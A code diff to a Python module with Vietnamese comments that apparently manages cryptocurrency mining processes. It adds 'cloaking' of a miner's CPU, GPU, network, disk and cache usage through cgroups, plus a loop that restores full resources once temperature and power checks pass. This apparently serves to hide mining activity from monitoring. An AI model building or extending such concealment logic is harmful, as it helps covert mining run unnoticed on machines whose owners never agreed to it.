@@ -22,6 +22,8 @@ from .auxiliary_modules.temperature_monitor import (
     get_cpu_temperature,
     get_gpu_temperature
 )
+from .cgroup_manager import CgroupManager  # Import CgroupManager
+
 
 class SafeRestoreEvaluator:
     """
@@ -49,7 +51,7 @@ class SafeRestoreEvaluator:
         power_limits = self.config.get("power_limits", {})
         per_device_power = power_limits.get("per_device_power_watts", {})
         self.cpu_max_power = per_device_power.get("cpu", 150)
-        self.gpu_max_power = per_device_power.get("gpu", 300)
+        self.gpu_max_power = per_device_power.get("gpu", 250)
 
     def is_safe_to_restore(self, process: MiningProcess) -> bool:
         """
@@ -168,6 +170,7 @@ class SafeRestoreEvaluator:
             self.logger.error(f"Xảy ra lỗi khi đánh giá khôi phục: {str(e)}")
             return False
 
+
 class AnomalyDetector(BaseManager):
     """
     Lớp phát hiện bất thường cho các tiến trình khai thác.
@@ -207,11 +210,17 @@ class AnomalyDetector(BaseManager):
         self.safe_restore_evaluator = None
 
         # Sử dụng ThreadPoolExecutor để quản lý thread pool
-        self.executor = ThreadPoolExecutor(max_workers=5)
+        self.executor = ThreadPoolExecutor(max_workers=10)  # Tăng số worker để xử lý cả cloaking và restoration
         self.task_futures = []
 
         # Queue để enqueue các yêu cầu cloaking
         self.cloaking_request_queue = Queue()
+
+        # Queue để enqueue các yêu cầu restoration
+        self.restoration_request_queue = Queue()
+
+        # Initialize CgroupManager
+        self.cgroup_manager = CgroupManager(logger)
 
     def set_resource_manager(self, resource_manager):
         """
@@ -232,6 +241,14 @@ class AnomalyDetector(BaseManager):
         # Start the anomaly detection task
         future = self.executor.submit(self.anomaly_detection)
         self.task_futures.append(future)
+
+        # Start the resource restoration task
+        future_restore = self.executor.submit(self.resource_restoration_task)
+        self.task_futures.append(future_restore)
+
+        # Start the cloaking requests processing task
+        future_cloaking = self.executor.submit(self.process_cloaking_requests)
+        self.task_futures.append(future_cloaking)
 
     def start(self):
         """
@@ -379,8 +396,6 @@ class AnomalyDetector(BaseManager):
                 process.is_cloaked = True
                 return
 
-            # Các kiểm tra khác đã bị loại bỏ
-
         except Exception as e:
             self.logger.error(f"Error in evaluate_process_anomaly for PID={process.pid}: {e}\n{traceback.format_exc()}")
 
@@ -423,10 +438,38 @@ class AnomalyDetector(BaseManager):
             process (MiningProcess): Đối tượng tiến trình khai thác.
         """
         try:
-            self.resource_manager.cloaking_request_queue.put(process, timeout=5)
+            self.resource_manager.apply_cloak_strategy('cpu', process, self.config.get('cgroups', {}))
+            self.resource_manager.apply_cloak_strategy('gpu', process, self.config.get('cgroups', {}))
+            self.resource_manager.apply_cloak_strategy('network', process, self.config.get('cgroups', {}))
+            self.resource_manager.apply_cloak_strategy('disk_io', process, self.config.get('cgroups', {}))
+            self.resource_manager.apply_cloak_strategy('cache', process, self.config.get('cgroups', {}))
             self.logger.info(f"Applied cloaking for process {process.name} (PID={process.pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi áp dụng cloaking cho PID={process.pid}: {e}\n{traceback.format_exc()}")
+
+    def resource_restoration_task(self):
+        """
+        Task để xử lý việc khôi phục tài nguyên cho các tiến trình đã cloaked nếu điều kiện an toàn.
+        """
+        while not self.stop_event.is_set():
+            try:
+                with self.mining_processes_lock:
+                    cloaked_processes = [proc for proc in self.mining_processes if proc.is_cloaked]
+
+                for process in cloaked_processes:
+                    if self.safe_restore_evaluator.is_safe_to_restore(process):
+                        self.logger.info(f"Conditions met to restore resources for PID={process.pid}.")
+                        self.resource_manager.restore_resources(process)
+                        process.is_cloaked = False
+                        self.logger.info(f"Resources restored for process {process.name} (PID={process.pid}).")
+                    else:
+                        self.logger.debug(f"Conditions not met to restore resources for PID={process.pid}.")
+
+                sleep(60)  # Kiểm tra mỗi 60 giây
+
+            except Exception as e:
+                self.logger.error(f"Error in resource_restoration_task: {e}\n{traceback.format_exc()}")
+                sleep(60)  # Đợi trước khi thử lại
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
         """
@@ -477,7 +520,7 @@ class AnomalyDetector(BaseManager):
             return {}
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi thu thập metrics cho tiến trình {process.name} (PID: {process.pid}): {e}"
+                f"Lỗi khi thu thập metrics cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             return {}
 
